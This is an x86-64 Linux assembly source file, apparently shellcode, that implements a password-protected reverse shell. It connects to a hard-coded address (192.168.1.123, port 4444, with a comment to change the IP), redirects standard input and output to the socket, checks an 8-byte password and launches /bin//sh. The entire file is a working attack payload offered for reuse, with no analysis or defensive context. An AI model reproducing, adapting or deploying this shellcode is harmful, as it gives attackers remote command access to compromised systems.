global _start

section .text

_start:
	      xor rsi, rsi
	      xor rdx, rdx
        mov al, 41
        mov dil, 2
        mov sil, 1
        ;mov dl, r11b ;use a zero'ed register to move zero value into rdx
        syscall

        mov rdi, rax

        xor rax, rax

        ;push rax
        ; change IP as reverse hex as needed
        mov dword [rsp-4], 0x7b01a8c0
        mov word [rsp-6], 0x5c11
        mov byte [rsp-8], 0x2 ;change from word to byte to only move 1 byte into the stack
        sub rsp, 8
        
        mov al, 42
        mov rsi, rsp
        mov dl, 16
        syscall

        xor rax, rax
        xor rsi, rsi
        mov al, 33
        mov rsi, rbx ;zero'ed register to move zero into RSI
        syscall

        mov al, 33
        mov sil, 1
        syscall

        mov al, 33
        mov sil, 2
        syscall

        xor rax, rax

        push r10
        mov rsi, rsp
        
        xor rdx, rdx
        mov dl, 8
        syscall

        xor rax, rax
        ; password '8bytesss'
        mov rax, 0x7373736574796238
        mov rdi, rsi
        scasq
        jne exit

        xor rax, rax
        push rax

        mov rbx, 0x68732f2f6e69622f
        push rbx

        mov rdi, rsp

        push rax

        mov rdx, rsp

        push rdi
        mov rsi, rsp
        mov al, 59
        syscall

exit:
        xor rax, rax
        mov al, 60
        syscall
